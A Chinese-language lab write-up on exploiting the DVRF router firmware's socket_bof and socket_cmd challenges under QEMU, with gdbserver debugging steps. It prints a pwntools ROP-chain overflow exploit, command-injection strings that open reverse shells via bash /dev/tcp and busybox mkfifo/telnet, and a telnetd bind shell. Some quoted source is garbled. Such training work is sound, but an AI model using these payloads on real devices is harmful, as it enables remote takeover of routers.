    gadget4 = 0x214A0 
    libc_base = 0x77ee2000
    #libc_base = 0x766e5000
    sleep_offset = 0x2F2B0
    data = "a"*51
    data += p32(gadget1+libc_base)
    data += "b"*0x58
    data += "bbbb" #s0
    data += p32(gadget2+libc_base) #s1
    data += p32(sleep_offset+libc_base) #s2
    data += p32(gadget0+libc_base)
    data +="c"*0x18
    data += p32(gadget4+libc_base) #s0
    data += "cccc" #s1
    data += "cccc" #s2
    data += p32(gadget3+libc_base) #ra
    data += "d"*0x18
    data += shellcode
    p = remote('127.0.0.1',9999)
    p.recvuntil('Send Me Bytes:')
    p.sendline(data)
    p.interactive()
运行成功的流程为分别在三个窗口执行下面的三条指令：
    nc -lvp 31337
    ./local.sh
    python exp.py
成功返回shell的图片如下：
###  qemu模拟调试
qemu里面模拟的过程，
1.可以安装上面两道题的方式进行调试。
2.还可以按照下面的方式来进行：
1）在qemu中
    chroot . ./pwnable/ShellCode_Required/socket_bof 9999 &
    gdbserver.mipsel 192.169.100.254:6666 --attach pid
如图所示：
2)在本机中运行
    gdb-multiarch
    target remote 192.168.100.3:6666
    vmmap
    c
如图所示：
由此我们可以知道libc的基地址
3）exp.py就是上面的，把libc_base改一下，remote的ip改一下。
4）在调试过程中，nc监听的端口总是接受不了到返回的shell，总是出现如图所示的内容影响，必须在调试到shellcode最后的时候，在监听端口的话，会返回shell。
5）正常运行，不进行调试的时候，成功如图所示：
###  总结
其实就是在qemu里面调试的时候会出现各种问题，例如gab-multiarch后面加不加程序路径，差异还是挺大的，总之就是多尝试一下。
## socket_cmd
这道题目涉及到了简单的命令注入的绕过。
###  漏洞分析
首先查看一下源码：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    // Pwnable Socket Program
    // By b1ack0wl
    // Command Injection
    int main(int argc, char **argv[])
    {
        if (argc & /dev/tcp/ip/port 0>&1`
然后运行，发现没有反弹shell，我们用gdb调试的时候，可以看到
但是并没有返回shell，目前不知道原因。
然后看其他的大佬的exp，把注入的命令改为
`123;bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'`
这样的话，就成功的返回了shell。
###  qemu模拟
接下来我们进行qemu的模拟。
1.首先我们启动qemu，因为是mips小端，所以我们用如下的启动脚本start.sh和net.sh的脚本用来网络连接，并且在qemu里面运行net.sh脚本，进行网络配置，随后在qemu中运行net.sh脚本，从而配置网络ip地址，使两边能互通。
2.我们将解包完的系统拷贝到qemu中：
    scp -r _DVRF_v03.bin.extracted root@192.168.100.3:/root/
3.我们开始模拟运行，并进行调试：
    cd _DVRF_v03.bin.extracted/squashfs-root
    chroot . ./pwnable/ShellCode_Required/socket_cmd 9999 &
    ../../gdbserver.mipsel 192.169.100.254:6666 --attach 1000
出现如图所示的界面：
说明gdbserver成功attach上，然后我们在本机运行：
    gdb-multiarch
    target remote 192.168.100.3:6666
然后我们接着下断点到0x400CF0，执行在本地调通的脚本，将`ip`和`port`修改一下，看system执行的命令,
可以看到确实是执行的我们输入的命令，但是在qemu端提示：bash not found，说明本地并没有bash指令。
4.我们接下来修改一下利用脚本，主要目的是利用固件中已有的指令去反弹shell。我们首先用busybox查看一下支持哪些指令，如下：
可以看到这个里面用到了telnet，telnetd，mkfifo等指令，所以我们可以利用`telnet+mkfifo`来反弹一个shell或者用`telnetd`，下面将分别讲解
1）反弹shell
我们将利用代码改为
    payload = "123;TF=/tmp/sh;busybox mkfifo $TF;busybox telnet 192.168.100.254 12345 0$TF"
这样的话，我们在本地运行`nc -lvp 12345`，这样的话，我们就能接收到反弹回来的shell，完整的利用代码如下：
    from pwn import *
    p = remote("192.168.100.3",9999)
    p.recvuntil("Send me a string:")
    payload = "123;TF=/tmp/sh;busybox mkfifo $TF;busybox telnet 192.168.100.254 12345 0$TF"
    p.sendline(payload)
    p.interactive()        
2）正向监听端口
我们将代码改为
    payload = "123;TF=/tmp/sh;busybox mkfifo $TF;busybox telnetd -l /bin/sh"
然后我们正向连接，并没有成功，不知道原因。
###  总结
之前的分析都是从有源码之后分析的，现在从IDA中无源码分析，感觉会对以后的IOT设备漏洞挖掘有帮助。
首先我们知道这是一个命令执行，我们先搜索`system`函数，看交叉引用，我们可以得到这就只有一个
我们跳到这，就看到下面IDA中所展现的内容：
我们根据途中所示的步骤，可以看跟踪到`system`的参数来自于socket的`read`中。
## 大总结
根据DVRF先初步入门了路由器的调试，但是没有设备真的是难受，以后会持续跟新一些真实路由器漏洞的浮现及调试情况，希望能对大家有点帮助，也是对自己学习的督促，加油。